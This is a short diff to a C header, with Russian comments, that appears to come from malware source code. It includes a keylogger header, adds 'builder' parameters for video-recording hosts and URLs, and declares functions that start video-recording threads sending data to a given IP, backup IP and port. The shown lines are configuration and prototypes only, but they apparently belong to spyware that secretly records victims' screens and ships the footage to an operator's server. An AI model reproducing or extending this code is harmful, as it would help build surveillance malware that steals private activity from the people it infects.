@@ -6,11 +6,18 @@
 #include "UniversalKeyLogger.h"
 
 
-// Максимальный размет буфера для записи адреса
-#define MAX_VIDEO_REC_URLS_LEN 3000
+// Настройки парметров для билдера
+#define VIDEOREC_PARAM_SIZE_HOST 50
+#define VIDEOREC_PARAM_SIZE_URLS 3000
 
-// Максимальный размер адреса записи потока видео
-#define MAX_VIDEO_REC_HOST_LEN 50
+#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
+#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
+#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"
+
+#define VIDEOREC_PARAM_ENCRYPTED_HOST false
+#define VIDEOREC_PARAM_ENCRYPTED_URLS false
+
+
 
 void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
 void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
